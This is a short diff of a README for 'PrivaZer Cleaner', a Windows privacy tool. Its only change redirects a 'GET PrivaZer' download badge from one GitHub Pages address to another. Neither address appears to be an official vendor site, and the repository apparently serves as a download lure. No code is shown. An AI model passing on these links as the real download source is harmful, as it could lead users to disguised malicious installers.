@@ -1,6 +1,6 @@
 # PrivaZer Cleaner - Windows Privacy Cleaner for Secure PC Cleanup
 
-[![GET PrivaZer](https://img.shields.io/badge/GET%20%E2%80%94%20PrivaZer-0078D6?style=for-the-badge&logoColor=white)](https://braylenwalshsftd.github.io/.github/privaZer-cleaner)
+[![GET PrivaZer](https://img.shields.io/badge/GET%20%E2%80%94%20PrivaZer-0078D6?style=for-the-badge&logoColor=white)](https://privazer-clean.github.io/.github/)
 
 ## PrivaZer Privacy Utility Overview
 
